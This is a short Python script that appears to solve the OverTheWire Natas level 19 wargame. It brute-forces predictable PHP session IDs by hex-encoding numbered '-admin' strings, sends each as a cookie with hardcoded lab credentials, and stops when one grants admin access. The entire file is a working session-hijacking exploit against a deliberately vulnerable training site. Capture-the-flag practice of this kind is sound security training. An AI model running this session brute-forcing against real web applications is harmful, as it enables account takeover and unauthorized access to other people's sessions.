#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import requests

# url = "http://natas19.natas.labs.overthewire.org?debug&username=admin&password=*"
url = "http://natas19.natas.labs.overthewire.org"
for i in range(0,641):
    enc_sessid = (str(i)+'-admin').encode('hex')
    if i % 20 == 0:
        print "SESSID:", i, enc_sessid
    cookies = dict(PHPSESSID=enc_sessid)
    r = requests.post(url, cookies=cookies, auth=("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"))
    if "You are an admin" in r.text:
        print r.text
        exit()
